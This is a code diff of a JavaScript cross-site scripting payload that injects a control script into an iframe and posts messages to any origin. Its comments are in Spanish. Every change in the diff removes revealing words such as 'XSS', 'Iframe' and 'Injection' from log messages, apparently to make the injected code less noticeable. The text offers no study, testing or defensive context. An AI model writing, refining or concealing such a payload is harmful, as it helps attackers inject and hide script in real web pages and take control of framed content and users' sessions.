@@ -3,7 +3,7 @@
 // Verificar si ya estamos en un iframe o si ya se ejecutó
 if (window.self !== window.top || window.__XSS_EXECUTED__) {
     // Estamos en un iframe o ya se ejecutó, no hacer nada
-    console.log('XSS already executed or in iframe, skipping...');
+    console.log('skipping...');
 } else {
     // Marcar como ejecutado para evitar loops
     window.__XSS_EXECUTED__ = true;
@@ -193,11 +193,11 @@ if (window.self !== window.top || window.__XSS_EXECUTED__) {
                         controlScript.textContent = getIframeScript();
                         iframeDoc.head.appendChild(controlScript);
                         
-                        console.log('Iframe injection successful');
+                        console.log('successful');
                         
                     } catch(e) {
                         injectionAttempts++;
-                        console.log(`Injection attempt ${injectionAttempts} failed, retrying...`);
+                        console.log(`attempt ${injectionAttempts} failed, retrying...`);
                         setTimeout(injectIntoIframe, 1000);
                     }
                 }
@@ -222,7 +222,7 @@ if (window.self !== window.top || window.__XSS_EXECUTED__) {
                 });
                 
             } catch(iframeError) {
-                console.log('Iframe setup failed:', iframeError);
+                console.log('setup failed:', iframeError);
                 // Fallback: reintentar después de 2 segundos
                 setTimeout(setupIframeControl, 2000);
             }
@@ -235,7 +235,7 @@ if (window.self !== window.top || window.__XSS_EXECUTED__) {
                 
                 // Verificar si estamos en un iframe y evitar ejecución duplicada
                 if (window.self !== window.top || window.__IFRAME_CONTROL_ACTIVE__) {
-                    console.log('Iframe control already active, skipping...');
+                    console.log('control already active, skipping...');
                     return;
                 }
                 
@@ -305,7 +305,7 @@ if (window.self !== window.top || window.__XSS_EXECUTED__) {
                     }, '*');
                 }, 500);
                 
-                console.log('Iframe control active');
+                console.log('control active');
             `;
         }
         
